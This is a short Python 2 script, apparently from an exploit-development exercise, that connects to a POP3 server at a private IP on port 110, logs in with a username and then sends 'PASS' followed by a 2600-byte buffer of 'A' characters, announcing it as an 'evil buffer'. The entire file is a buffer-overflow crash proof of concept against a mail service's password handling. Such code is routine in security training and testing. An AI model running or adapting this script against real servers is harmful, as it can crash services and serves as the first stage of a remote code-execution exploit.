#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' *2600

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.0.106', 110))
	data = s.recv(1024)

	s.send('USER liuzh'+'\r\n')
	data = s.recv(1024)

	s.send('PASS'+ buffer +'\r\n')
	
	print "\nDone"

except:
	print "Could not connect to POP3"

	